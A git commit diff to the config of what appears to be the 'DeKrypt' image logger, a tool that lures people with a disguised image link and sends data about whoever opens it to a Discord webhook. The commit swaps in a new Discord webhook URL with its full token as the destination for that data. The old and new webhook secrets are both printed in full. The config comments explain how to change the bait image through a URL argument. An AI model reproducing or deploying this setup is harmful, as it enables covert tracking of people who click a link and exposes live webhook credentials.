fb916f901d66f435fafe8ec94e9a9cddfbb2f1c2
y9htnhfbyz-glitch <y9htnhfbyz@privaterelay.appleid.com>
2025-11-07 00:12:39 +0300

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "webhook": "https://discord.com/api/webhooks/1436100879295053947/y3cmZFEtfIwBDBeJg4RrkC-4MulNYYpVTAiIVxJcN-YAOtsbE8U4oh3icKDXB4fY3PRx",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -302,3 +302,4 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
+
